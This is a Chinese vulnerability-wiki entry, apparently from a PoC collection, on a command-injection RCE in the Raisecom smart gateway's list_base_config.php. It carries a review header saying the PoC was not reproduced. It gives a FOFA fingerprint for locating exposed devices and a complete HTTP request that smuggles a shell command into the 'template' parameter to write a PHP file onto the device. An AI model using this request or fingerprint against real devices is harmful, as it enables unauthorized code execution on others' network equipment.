---
source: "SourByte05/Vulnerability-Wiki-PoC"
id: "vw-df93bdc70f9fb73d0df96300"
entity_id: "ve-df93bdc70f9fb73d0df96300"
schema_version: "1"
fofa_unverified: "body="
title: "瑞斯康达智能网关 RCE漏洞"
product: "Raisecom智能网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "型号、固件、鉴权不明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E7%91%9E%E6%96%AF%E5%BA%B7%E8%BE%BE/%E7%91%9E%E6%96%AF%E5%BA%B7%E8%BE%BE%E6%99%BA%E8%83%BD%E7%BD%91%E5%85%B3%20RCE%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
---

# 瑞斯康达智能网关 RCE漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Raisecom智能网关
- 本文讨论：list_base_config.php template命令注入
- 版本、权限与配置前提：型号、固件、鉴权不明
- 资料类型：命令注入PoC重稿；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 与351/352仅测试文件名jp.php等差异，同入口重稿
- 已知在野和广泛影响无来源，固定版本缺失；fofa残缺
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 截图是否独立实验及范围待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 漏洞描述

瑞斯康达智能网关是一种用于电信和企业网络的高性能设备，主要用于边缘网络接入和智能数据处理。它集成了多种网络功能，如路由、交换、防火墙和VPN，能够支持多种接入方式，如光纤、以太网和无线通信等。list_base_config.php可进行命令注入攻击，导致远程代码执行。

影响版本

瑞斯康达智能网关

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 高 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/images/raisecom/back.gif" && title=="Web user login"

POC/EXP：

```http
GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Fjp.php%60 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```


![image-20240814175652003](./.resource/瑞斯康达智能网关RCE漏洞/media/image-20240814175652003.png)


![image-20240814175718663](./.resource/瑞斯康达智能网关RCE漏洞/media/image-20240814175718663.png)


该漏洞影响范围广泛，定义为重要漏洞预警

![image-20240814180020056](./.resource/瑞斯康达智能网关RCE漏洞/media/image-20240814180020056.png)


![image-20240814180038659](./.resource/瑞斯康达智能网关RCE漏洞/media/image-20240814180038659.png)


# 修复方案

1. 关闭互联网暴露面或接口设置访问权限

   升级至安全版本
   
   及时关注厂商修复方案。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
